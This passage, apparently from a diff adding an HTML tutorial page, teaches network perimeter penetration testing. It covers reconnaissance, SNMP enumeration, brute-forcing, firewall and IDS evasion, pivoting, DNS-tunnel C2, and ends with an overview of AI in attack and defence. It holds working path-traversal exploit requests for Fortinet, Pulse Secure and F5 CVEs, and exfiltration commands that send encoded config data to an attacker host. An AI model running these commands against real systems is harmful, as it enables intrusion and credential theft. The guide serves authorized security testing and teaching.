+      <div class="vcdesc">Cisco ASA, Palo Alto, Fortinet FortiGate, pfSense, Check Point. Misconfigured ACLs, default credentials, outdated firmware with known CVEs (ZeroLogon, Heartbleed predecessors), and exposed web management interfaces are the primary attack vectors. Rules permitting overly broad traffic often exist due to misconfiguration or legacy exceptions.</div>
+      <span class="sev sc">CRITICAL TARGET</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">02</span>
+      <div class="vcname">Routers</div>
+      <div class="vcdesc">Cisco IOS/IOS-XE, Juniper, MikroTik, Huawei. Telnet enabled by default on legacy devices, default credentials (cisco/cisco, admin/admin), SNMP community strings set to "public", and unencrypted management access over HTTP are pervasive. Routing protocol attacks (BGP hijacking, OSPF injection) can redirect entire subnets.</div>
+      <span class="sev sc">CRITICAL TARGET</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">03</span>
+      <div class="vcname">VPN Gateways</div>
+      <div class="vcdesc">OpenVPN, IPSec/IKEv2, SSL-VPN (Pulse Secure, Fortinet, Cisco AnyConnect). SSL-VPN vulnerabilities have been massively exploited — CVE-2019-11510 (Pulse Secure) and CVE-2018-13379 (Fortinet) enabled unauthenticated file read and credential theft at scale. Weak pre-shared keys, missing MFA, and split tunnelling misconfigurations are common findings.</div>
+      <span class="sev sc">CRITICAL TARGET</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">04</span>
+      <div class="vcname">IDS / IPS Systems</div>
+      <div class="vcdesc">Snort, Suricata, Cisco FirePOWER, Palo Alto Threat Prevention. Outdated signature databases miss known threats. Management interfaces (web console, SSH) frequently run with default credentials. IPS bypass techniques — fragmentation, encoding, protocol-level obfuscation — allow attackers to conduct exploitation undetected.</div>
+      <span class="sev sh">HIGH TARGET</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">05</span>
+      <div class="vcname">Load Balancers</div>
+      <div class="vcdesc">F5 BIG-IP, Citrix ADC (NetScaler), HAProxy. F5 BIG-IP TMUI RCE (CVE-2020-5902) and Citrix ADC directory traversal (CVE-2019-19781) each allowed unauthenticated remote code execution and were exploited at massive scale within days of public disclosure. Management interfaces on non-standard ports are frequently internet-exposed.</div>
+      <span class="sev sh">HIGH TARGET</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">06</span>
+      <div class="vcname">Network Management</div>
+      <div class="vcdesc">SNMP-enabled devices exposing community strings, Syslog servers, TACACS+/RADIUS authentication servers, and network monitoring platforms. SNMP with "public" community strings provides read access to device configuration — routing tables, interface lists, and often credentials. Write-enabled SNMP can modify device configuration entirely.</div>
+      <span class="sev sh">HIGH TARGET</span>
+    </div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     03 — PHASE I: RECONNAISSANCE
+══════════════════════════════════ -->
+<section class="sec rv" id="recon">
+  <div class="sec-hd">
+    <span class="sec-n">03 //</span>
+    <h2 class="sec-t">Phase I — Reconnaissance<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Reconnaissance maps the external attack surface before any active probing begins. Passive reconnaissance extracts intelligence from public sources — search engines, certificate transparency logs, WHOIS records, and internet-wide scanner databases — without generating a single packet destined for the target. Active reconnaissance interacts directly with target systems to fingerprint services, identify open ports, and extract banner information. The distinction matters for operational security: passive recon is nearly invisible; active recon generates log entries on the target.</p>
+  </div>
+
+  <div class="tgrid rv">
+    <div class="tc"><div class="tcname">Shodan</div><span class="tctag">Passive · OSINT</span><div class="tcdesc">Internet-wide scan database — find exposed firewalls, VPN gateways, and management interfaces by product name, banner, or port without touching the target</div></div>
+    <div class="tc"><div class="tcname">Nmap</div><span class="tctag">Active · Port Scan</span><div class="tcdesc">Comprehensive port scanning, service version detection, OS fingerprinting, and NSE script execution against perimeter devices</div></div>
+    <div class="tc"><div class="tcname">Censys / FOFA</div><span class="tctag">Passive · OSINT</span><div class="tcdesc">Certificate transparency and banner scanning — identify VPN gateways, firewall management ports, and exposed services with precise version data</div></div>
+    <div class="tc"><div class="tcname">theHarvester</div><span class="tctag">Passive · OSINT</span><div class="tcdesc">Aggregate email addresses, subdomains, hosts, and IP ranges from public sources — maps the organisation's full external footprint</div></div>
+    <div class="tc"><div class="tcname">Netcat / Telnet</div><span class="tctag">Active · Banner Grab</span><div class="tcdesc">Manual banner grabbing from open service ports — reveals exact firmware versions, software builds, and sometimes usernames in service banners</div></div>
+    <div class="tc"><div class="tcname">Firewalk / Traceroute</div><span class="tctag">Active · Firewall</span><div class="tcdesc">Map firewall rules by sending packets with incrementing TTLs — identify which ports are permitted through the perimeter without triggering exploitation</div></div>
+  </div>
+
+  <div class="cb rv" data-l="Passive &amp; Active Reconnaissance Commands">
+    <code><span class="cmt"># Passive — Shodan CLI search for exposed firewall management interfaces</span>
+<span class="cmd">shodan</span> search <span class="str">"Cisco ASA HTTP Configuration"</span>
+<span class="cmd">shodan</span> search <span class="str">"Fortinet SSL-VPN"</span> <span class="flag">--fields</span> ip_str,port,org
+<span class="cmd">shodan</span> host <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Active — comprehensive Nmap scan of all ports with service detection</span>
+<span class="cmd">nmap</span> <span class="flag">-p 1-65535 -sV -sC -O -T4 --open</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Targeted scan of perimeter-relevant ports</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -p</span> 22,23,80,161,443,500,4444,4500,8080,8443,10443 <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Banner grabbing — identify exact software version from service banner</span>
+<span class="cmd">nc</span> <span class="flag">-v</span> <span class="prm">&lt;TARGET-IP&gt;</span> 443
+<span class="cmd">nc</span> <span class="flag">-v</span> <span class="prm">&lt;TARGET-IP&gt;</span> 22
+
+<span class="cmt"># Firewall analysis — map ACL rules using TTL manipulation</span>
+<span class="cmd">traceroute</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">firewalk</span> <span class="flag">-S 1-1024</span> <span class="prm">&lt;GATEWAY-IP&gt; &lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># WHOIS and DNS reconnaissance</span>
+<span class="cmd">whois</span> <span class="prm">&lt;TARGET-DOMAIN&gt;</span>
+<span class="cmd">dig</span> <span class="flag">ANY</span> <span class="prm">&lt;TARGET-DOMAIN&gt;</span>
+<span class="cmd">theHarvester</span> <span class="flag">-d</span> <span class="prm">&lt;TARGET-DOMAIN&gt;</span> <span class="flag">-b all</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     04 — PHASE II: SCANNING & ENUMERATION
+══════════════════════════════════ -->
+<section class="sec rv" id="scan">
+  <div class="sec-hd">
+    <span class="sec-n">04 //</span>
+    <h2 class="sec-t">Phase II — Scanning &amp; Enumeration<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>With the attack surface mapped, scanning identifies specific vulnerabilities in discovered services. This phase moves from reconnaissance (what exists?) to vulnerability identification (what is exploitable?). Network perimeter devices are particularly productive targets for SNMP enumeration — many organisations deploy devices with default community strings that expose complete routing tables, interface configurations, and ARP caches. NSE scripts extend Nmap into a powerful vulnerability scanner for network device-specific issues.</p>
+  </div>
+
+  <div class="cb rv" data-l="Nmap NSE — Firewall &amp; VPN Vulnerability Scanning">
+    <code><span class="cmt"># Run vulnerability detection scripts against perimeter devices</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> firewall-bypass,vuln,auth <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Check for SSL/TLS vulnerabilities — weak ciphers, POODLE, BEAST, DROWN</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> ssl-enum-ciphers,ssl-poodle,ssl-heartbleed <span class="flag">-p 443,8443</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># SMB vulnerabilities on exposed network devices</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> smb-vuln-ms17-010,smb-security-mode <span class="flag">-p 445</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Check for default credentials on management interfaces</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> http-default-accounts,telnet-ntlm-info,ssh-auth-methods <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Web interface scanning with Nikto — management consoles on 443/8080/8443</span>
+<span class="cmd">nikto</span> <span class="flag">-h</span> https://<span class="prm">&lt;TARGET-IP&gt;</span>:8443 <span class="flag">-ssl</span></code>
+  </div>
+
+  <div class="cb rv" data-l="SNMP Enumeration — Router &amp; Firewall Configuration Extraction">
+    <code><span class="cmt"># Discover SNMP community strings via brute force</span>
+<span class="cmd">onesixtyone</span> <span class="flag">-c</span> /usr/share/wordlists/snmp_community.txt <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># SNMPwalk — extract full MIB tree from a device with known community string</span>
+<span class="cmd">snmpwalk</span> <span class="flag">-v2c -c</span> <span class="str">public</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Extract specific SNMP OIDs — system info, interfaces, routing table</span>
+<span class="cmd">snmpget</span> <span class="flag">-v2c -c</span> <span class="str">public</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="str">sysDescr.0</span>       <span class="cmt"># OS and firmware version</span>
+<span class="cmd">snmpwalk</span> <span class="flag">-v2c -c</span> <span class="str">public</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="str">ipRouteTable</span>   <span class="cmt"># Full routing table</span>
+<span class="cmd">snmpwalk</span> <span class="flag">-v2c -c</span> <span class="str">public</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="str">ifTable</span>        <span class="cmt"># All network interfaces</span>
+
+<span class="cmt"># Automated SNMP enumeration with snmp-check</span>
+<span class="cmd">snmp-check</span> <span class="flag">-t</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="flag">-c</span> <span class="str">public</span> <span class="flag">-v 2c</span>
+
+<span class="cmt"># Metasploit SNMP auxiliary scanner</span>
+<span class="cmd">use</span> auxiliary/scanner/snmp/snmp_enum
+<span class="cmd">set</span> RHOSTS <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">set</span> COMMUNITY <span class="str">public</span>
+<span class="cmd">run</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     05 — PHASE III: EXPLOITATION
+══════════════════════════════════ -->
+<section class="sec rv" id="exploit">
+  <div class="sec-hd">
+    <span class="sec-n">05 //</span>
+    <h2 class="sec-t">Phase III — Exploitation of Perimeter Devices<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Exploitation validates that identified vulnerabilities are genuinely exploitable — transforming theoretical risk into demonstrated business impact. Network device exploitation differs from application exploitation: the goal is rarely to execute arbitrary code (though that is possible) but more commonly to gain administrative access to the device itself, enabling traffic manipulation, configuration extraction, and network-level control. All exploitation must be conducted conservatively to avoid disrupting live services.</p>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Default &amp; Weak Credential Exploitation</div>
+    <div class="atk-body">Default credentials are the single most reliably exploited vector in network device assessments. Cisco devices historically shipped with "cisco/cisco", many SOHO routers with "admin/admin" or blank passwords, and SNMP with "public"/"private" community strings. Even organisations with mature security programmes routinely have forgotten devices — decommissioned VPN concentrators, legacy switches — still reachable with factory defaults. Hydra enables systematic credential testing across SSH, Telnet, HTTP, and SNMP simultaneously.</div>
+    <div class="cb" data-l="Hydra — Multi-Protocol Credential Testing">
+      <code><span class="cmt"># SSH credential brute-force — common for routers and firewalls</span>
+<span class="cmd">hydra</span> <span class="flag">-L</span> /usr/share/wordlists/network_users.txt \
+      <span class="flag">-P</span> /usr/share/wordlists/network_pass.txt \
+      <span class="flag">-t 4 -f</span> ssh://<span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Telnet — still common on legacy Cisco IOS devices</span>
+<span class="cmd">hydra</span> <span class="flag">-l</span> <span class="str">admin</span> <span class="flag">-P</span> /usr/share/wordlists/cisco_passwords.txt \
+      telnet://<span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># VPN gateway HTTP management interface</span>
+<span class="cmd">hydra</span> <span class="flag">-L</span> users.txt <span class="flag">-P</span> pass.txt <span class="flag">-s 8443</span> https-post-form://<span class="prm">&lt;TARGET-IP&gt;</span>/
+
+<span class="cmt"># Test common default credential pairs manually for Cisco devices</span>
+<span class="cmd">ssh</span> cisco@<span class="prm">&lt;TARGET-IP&gt;</span>        <span class="cmt"># Password: cisco</span>
+<span class="cmd">ssh</span> admin@<span class="prm">&lt;TARGET-IP&gt;</span>        <span class="cmt"># Password: admin or blank</span>
+<span class="cmd">ssh</span> enable@<span class="prm">&lt;TARGET-IP&gt;</span>       <span class="cmt"># Enable password: cisco or blank</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Known CVE Exploitation — Firewall &amp; VPN RCE</div>
+    <div class="atk-body">SSL-VPN vulnerabilities have been among the most impactful network security findings of the last five years. CVE-2019-11510 (Pulse Secure — unauthenticated arbitrary file read, exposing cleartext credentials) and CVE-2018-13379 (Fortinet SSL-VPN — unauthenticated path traversal exposing session files with cleartext credentials) were both exploited by nation-state actors within weeks of disclosure. F5 BIG-IP TMUI RCE (CVE-2020-5902) allowed unauthenticated remote code execution on the load balancer management interface. These vulnerabilities remain relevant in environments slow to patch.</div>
+    <div class="cb" data-l="CVE Exploitation — SSL-VPN &amp; Firewall Vulnerabilities">
+      <code><span class="cmt"># CVE-2018-13379 — Fortinet SSL-VPN credential file exposure (path traversal)</span>
+<span class="cmd">curl</span> <span class="flag">-sk</span> <span class="str">"https://&lt;TARGET-IP&gt;:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"</span>
+<span class="cmt"># If vulnerable: response contains cleartext usernames and passwords</span>
+
+<span class="cmt"># CVE-2019-11510 — Pulse Secure arbitrary file read</span>
+<span class="cmd">curl</span> <span class="flag">-sk</span> <span class="str">"https://&lt;TARGET-IP&gt;/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"</span>
+
+<span class="cmt"># CVE-2020-5902 — F5 BIG-IP TMUI RCE (unauthenticated)</span>
+<span class="cmd">curl</span> <span class="flag">-sk</span> <span class="str">"https://&lt;TARGET-IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"</span>
+
+<span class="cmt"># Use Metasploit for automated exploitation of known CVEs</span>
+<span class="cmd">search</span> fortinet
+<span class="cmd">use</span> auxiliary/scanner/http/fortios_traversal
+<span class="cmd">set</span> RHOSTS <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">run</span>
+
+<span class="cmt"># ALWAYS verify target is patched against known CVEs before exploitation</span>
+<span class="cmd">nmap</span> <span class="flag">--script</span> http-vuln-cve2020-5902 <span class="flag">-p 443,8443</span> <span class="prm">&lt;TARGET-IP&gt;</span></code>
+    </div>
+  </div>
+
+  <div class="atk rv">
+    <div class="atk-name">⟩ Firewall Rule Bypass Techniques</div>
+    <div class="atk-body">Firewall rule bypass exploits weaknesses in ACL design — overly permissive rules, protocol confusion, or state-table manipulation. Common techniques include source port spoofing (crafting packets from ports 20, 53, or 80 that many firewalls permit by default), ACK scanning to bypass stateless packet filters, IPv6 bypass (many firewalls with strong IPv4 rules have no IPv6 ACLs), and fragmentation attacks that split malicious content across multiple packets the IDS/IPS reassembles incorrectly.</div>
+    <div class="cb" data-l="Firewall Rule Bypass Techniques">
+      <code><span class="cmt"># ACK scan — bypasses stateless packet filters (distinguishes filtered vs closed)</span>
+<span class="cmd">nmap</span> <span class="flag">-sA -p 1-1000</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Source port manipulation — firewalls often permit source port 53 (DNS)</span>
+<span class="cmd">nmap</span> <span class="flag">-g 53 -sS -p 445</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+
+<span class="cmt"># Fragment packets to evade IDS/IPS signature detection</span>
+<span class="cmd">nmap</span> <span class="flag">-f -p 80,443</span> <span class="prm">&lt;TARGET-IP&gt;</span>
+<span class="cmd">nmap</span> <span class="flag">--mtu 8 -p 80</span> <span class="prm">&lt;TARGET-IP&gt;</span>   <span class="cmt"># 8-byte MTU fragmentation</span>
+
+<span class="cmt"># IPv6 — test if perimeter has no IPv6 ACLs when IPv4 is heavily filtered</span>
+<span class="cmd">nmap</span> <span class="flag">-6 -sV</span> <span class="prm">&lt;TARGET-IPv6-ADDRESS&gt;</span>
+
+<span class="cmt"># Decoy scan — hide real source IP among fake decoy IPs</span>
+<span class="cmd">nmap</span> <span class="flag">-D RND:10 -sS -p 80,443</span> <span class="prm">&lt;TARGET-IP&gt;</span></code>
+    </div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     06 — PHASE IV: PIVOT
+══════════════════════════════════ -->
+<section class="sec rv" id="pivot">
+  <div class="sec-hd">
+    <span class="sec-n">06 //</span>
+    <h2 class="sec-t">Phase IV — Privilege Escalation &amp; Lateral Movement<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Once initial access is gained on a perimeter device, the assessment pivots to demonstrate the full blast radius. Administrative access to a firewall or router provides visibility into every subnet it serves, the ability to create new firewall rules, access to VPN credential stores, and frequently direct SSH/Telnet access to internal management networks. Lateral movement through the network is often trivial once the perimeter device itself is controlled — the attacker now speaks from a position of implicit trust.</p>
+  </div>
+
+  <div class="cb rv" data-l="Cisco IOS — Post-Access Enumeration &amp; Pivot">
+    <code><span class="cmt"># After gaining SSH/Telnet access to a Cisco IOS device</span>
+<span class="cmd">show version</span>                 <span class="cmt"># IOS version, hardware model, uptime</span>
+<span class="cmd">show running-config</span>          <span class="cmt"># FULL device configuration — ACLs, passwords, VPN keys</span>
+<span class="cmd">show ip route</span>                <span class="cmt"># Complete routing table — maps all connected networks</span>
+<span class="cmd">show ip interface brief</span>      <span class="cmt"># All interfaces and IP addresses</span>
+<span class="cmd">show cdp neighbors detail</span>   <span class="cmt"># Cisco Discovery Protocol — reveals adjacent devices</span>
+<span class="cmd">show arp</span>                     <span class="cmt"># ARP table — live hosts on connected subnets</span>
+<span class="cmd">show users</span>                   <span class="cmt"># Currently logged-in users</span>
+
+<span class="cmt"># Privilege escalation — attempt to enter enable mode</span>
+<span class="cmd">enable</span>                       <span class="cmt"># Enter privileged exec (try blank, 'cisco', 'enable')</span>
+<span class="cmd">show running-config</span> <span class="flag">| include</span> enable secret  <span class="cmt"># Extract hashed enable password</span>
+
+<span class="cmt"># Extract VPN pre-shared keys from config</span>
+<span class="cmd">show running-config</span> <span class="flag">| include</span> pre-shared-key
+<span class="cmd">show running-config</span> <span class="flag">| include</span> password
+
+<span class="cmt"># Use compromised router as a pivot — set up SSH tunnel to internal hosts</span>
+<span class="cmd">ssh</span> <span class="flag">-L 8080:10.0.0.5:80</span> admin@<span class="prm">&lt;ROUTER-IP&gt;</span>
+<span class="cmt"># Internal web server at 10.0.0.5:80 now accessible at localhost:8080</span>
+
+<span class="cmt"># Set up SOCKS proxy through compromised perimeter device</span>
+<span class="cmd">ssh</span> <span class="flag">-D 1080 -N</span> admin@<span class="prm">&lt;ROUTER-IP&gt;</span>
+<span class="cmd">proxychains</span> <span class="cmd">nmap</span> <span class="flag">-sT</span> 10.0.0.0/24    <span class="cmt"># Scan internal network via pivot</span></code>
+  </div>
+
+  <div class="cb rv" data-l="VPN Trust Abuse — Pivoting into Internal Networks">
+    <code><span class="cmt"># If VPN credentials are extracted — connect to VPN and access internal network</span>
+<span class="cmd">openvpn</span> <span class="flag">--config</span> extracted_vpn.ovpn
+
+<span class="cmt"># Internal network reachable once VPN tunnel is established</span>
+<span class="cmd">ip route show</span>                <span class="cmt"># Verify internal routes are pushed</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -p 22,80,443,445,3389</span> 10.0.0.0/24   <span class="cmt"># Scan internal subnet</span>
+
+<span class="cmt"># SSH tunnelling through compromised DMZ host to reach internal segments</span>
+<span class="cmd">ssh</span> <span class="flag">-L 3389:10.10.10.50:3389</span> user@<span class="prm">&lt;DMZ-HOST&gt;</span>
+<span class="cmt"># RDP to internal Windows host via localhost:3389</span>
+
+<span class="cmt"># DNS tunnelling for C2 through restrictive firewalls using DNSCat2</span>
+<span class="cmt"># Server side (attacker controlled external DNS server):</span>
+<span class="cmd">dnscat2-server</span> <span class="prm">&lt;YOUR-DOMAIN&gt;</span>
+<span class="cmt"># Client side (on compromised internal host):</span>
+<span class="cmd">./dnscat2</span> <span class="flag">--dns</span> domain=<span class="prm">&lt;YOUR-DOMAIN&gt;</span> <span class="flag">--secret</span> <span class="prm">&lt;SHARED-SECRET&gt;</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     07 — PHASE V: EXFILTRATION
+══════════════════════════════════ -->
+<section class="sec rv" id="exfil">
+  <div class="sec-hd">
+    <span class="sec-n">07 //</span>
+    <h2 class="sec-t">Phase V — Data Exfiltration Demonstration<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>The exfiltration phase demonstrates the real-world impact of a perimeter compromise — what data an attacker could extract, and through which channels. Network device configurations contain extraordinarily sensitive data: firewall ACLs revealing the internal network topology, VPN pre-shared keys granting remote access, SNMP community strings providing read/write access to all managed devices, and routing tables mapping every subnet in the organisation. In a penetration test, this phase is conducted minimally and with explicit scope approval — the goal is demonstration of capability, not actual data theft.</p>
+  </div>
+
+  <div class="cb rv" data-l="Exfiltration — Network Device Config &amp; Credential Extraction">
+    <code><span class="cmt"># Extract complete device configuration via TFTP (if enabled)</span>
+<span class="cmd">copy running-config tftp</span>    <span class="cmt"># On Cisco device — copies config to TFTP server</span>
+<span class="cmt"># Sets up TFTP server on attacker machine: atftpd --daemon /tmp/tftp</span>
+
+<span class="cmt"># SNMP configuration dump — no authentication needed with "public" string</span>
+<span class="cmd">snmpwalk</span> <span class="flag">-v2c -c</span> <span class="str">private</span> <span class="prm">&lt;TARGET-IP&gt;</span> <span class="flag">-On</span> > full_snmp_dump.txt
+
+<span class="cmt"># DNS tunnelling exfiltration — encode data in DNS queries to bypass DPI</span>
+<span class="cmt"># Using iodine to establish a full IP tunnel over DNS</span>
+<span class="cmd">iodined</span> <span class="flag">-f -c -P</span> <span class="str">secretpassword</span> 10.99.0.1 <span class="prm">&lt;YOUR-DNS-DOMAIN&gt;</span>
+
+<span class="cmt"># HTTP data exfiltration disguised as normal web traffic</span>
+<span class="cmt"># Encode sensitive data in HTTP headers or URL parameters</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> https://attacker.example.com/beacon \
+  <span class="flag">-H</span> <span class="str">"X-Data: $(cat /etc/config | base64)"</span>
+
+<span class="cmt"># SSH exfiltration — encrypted transfer through allowed outbound SSH</span>
+<span class="cmd">scp</span> config_backup.txt attacker@<span class="prm">&lt;ATTACKER-IP&gt;</span>:/exfil/</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     08 — AI INTEGRATION (SPECIAL)
+══════════════════════════════════ -->
+<div class="div div-ai"></div>
+
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd">
+    <span class="sec-n">08 //</span>
+    <h2 class="sec-t">AI Integration in Network Penetration Testing<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel panel-ai rv-l">
+    <p>Artificial Intelligence is fundamentally reshaping both sides of the network security equation. On the offensive side, AI accelerates reconnaissance, automates vulnerability chaining, generates novel exploit variations, and enables intelligent evasion of signature-based detection. On the defensive side, AI powers anomaly detection, threat hunting, automated incident response, and predictive risk scoring. Understanding AI's role in network penetration testing — both as a tool and as an adversarial challenge — is now a core competency for modern security professionals.</p>
+    <p>This is not a distant future — AI-assisted offensive tools are deployed today by both nation-state actors and commercial red teams. Security professionals who do not understand and leverage AI capabilities are operating at a structural disadvantage against adversaries who do.</p>
+  </div>
+
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">AI does not replace the penetration tester — it <strong>dramatically amplifies</strong> their capabilities. Manual expertise is still required to interpret AI output, make contextual decisions, understand business risk, and conduct exploits that require real-world judgement. AI handles scale, speed, and pattern recognition; the human handles strategy, creativity, and accountability.</p>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--p);text-transform:uppercase;margin:28px 0 16px;">AI Capabilities in Offensive Network Security</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card">
+      <span class="ai-card-icon">🧠</span>
+      <div class="ai-card-name">Intelligent Reconnaissance</div>
+      <div class="ai-card-desc">AI models analyse OSINT data at scale — correlating Shodan results, certificate transparency logs, DNS records, and dark web data to automatically build a comprehensive target profile that would take a human analyst hours or days to assemble manually.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">⚡</span>
+      <div class="ai-card-name">Automated Vulnerability Chaining</div>
+      <div class="ai-card-desc">AI systems can analyse discovered vulnerability sets and automatically identify multi-step attack chains — combining a credential exposure on one service with a misconfiguration on another to reach a target that neither vulnerability alone would reach.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🔀</span>
+      <div class="ai-card-name">Adaptive Payload Generation</div>
+      <div class="ai-card-desc">LLM-assisted exploit development generates novel payload variations, custom encoders, and evasion-aware shellcode in response to observed defensive signatures — dramatically reducing the time from vulnerability discovery to working exploit.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🕶</span>
+      <div class="ai-card-name">Behavioural Evasion</div>
+      <div class="ai-card-desc">AI models trained on EDR/IDS detection logic generate network traffic patterns and timing profiles that mimic legitimate behaviour — spreading scans across time windows, randomising packet timing, and mimicking specific application protocols to avoid detection.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🗺</span>
+      <div class="ai-card-name">Attack Path Optimisation</div>
+      <div class="ai-card-desc">Graph neural networks model complex network topologies and automatically identify the shortest privilege escalation path from initial access to the highest-value target — prioritising exploitation steps by business impact and detection risk simultaneously.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">📊</span>
+      <div class="ai-card-name">AI-Enhanced Reporting</div>
+      <div class="ai-card-desc">LLMs process raw exploitation output — crash dumps, configuration extracts, session logs — and generate structured, risk-rated penetration test reports with technical detail and executive summaries, dramatically reducing post-engagement documentation time.</div>
+    </div>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--p);text-transform:uppercase;margin:32px 0 16px;">AI in Defensive Network Security</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card">
+      <span class="ai-card-icon">📡</span>
+      <div class="ai-card-name">Anomaly Detection at Scale</div>
+      <div class="ai-card-desc">ML models trained on baseline network traffic automatically detect deviations — unusual protocol distributions, unexpected port usage, anomalous data volumes, or atypical connection timing — that signature-based IDS/IPS systems cannot identify because they have no known signature.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🔭</span>
+      <div class="ai-card-name">AI-Powered Threat Hunting</div>
+      <div class="ai-card-desc">Security analysts use AI to proactively search network logs, PCAP data, and firewall rule changes for indicators of compromise — correlating events across time windows and data sources that are impossible to manually correlate at the volume modern networks generate.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🤖</span>
+      <div class="ai-card-name">Automated Incident Response</div>
+      <div class="ai-card-desc">SOAR platforms enhanced with AI automatically block attacking IPs, isolate compromised network segments, revoke compromised credentials, and trigger forensic data collection in response to detected attacks — reducing mean time to contain from hours to seconds.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🔮</span>
+      <div class="ai-card-name">Predictive Risk Scoring</div>
+      <div class="ai-card-desc">AI models analyse asset exposure, vulnerability age, attack trend data, and organisational context to predict which vulnerabilities are most likely to be exploited in the next attack window — enabling risk-prioritised patching that is impossible with CVSS alone.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🧬</span>
+      <div class="ai-card-name">Network Behaviour Baselining</div>
+      <div class="ai-card-desc">Unsupervised ML continuously learns normal communication patterns for every device on the network — peer relationships, protocol usage, connection timing, and data volumes. Any deviation from this learned baseline triggers investigation, including zero-day lateral movement with no known IOC.</div>
+    </div>
+    <div class="ai-card">
+      <span class="ai-card-icon">🛡</span>
+      <div class="ai-card-name">Dynamic Firewall Adaptation</div>
+      <div class="ai-card-desc">AI-driven firewall systems dynamically tighten rules in response to observed attack patterns — automatically creating temporary blocks, tightening geo-restrictions, and adjusting IPS sensitivity thresholds in real time without requiring manual policy updates.</div>
+    </div>
+  </div>
+
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">Practical AI Tools for Network Pen Testers</div>
+    <table class="ptbl">
+      <thead><tr><th>Tool / Platform</th><th>AI Capability</th><th>Use in Network PT</th></tr></thead>
+      <tbody>
+        <tr><td>PentestGPT</td><td>LLM-guided penetration testing workflow</td><td>Step-by-step methodology guidance, exploit suggestion, report generation</td></tr>
+        <tr><td>AutoGPT / Agent frameworks</td><td>Autonomous multi-step task execution</td><td>Automated reconnaissance, vulnerability research, initial payload generation</td></tr>
+        <tr><td>Nuclei + AI templates</td><td>AI-generated vulnerability templates</td><td>Custom CVE detection templates for newly disclosed network device vulnerabilities</td></tr>
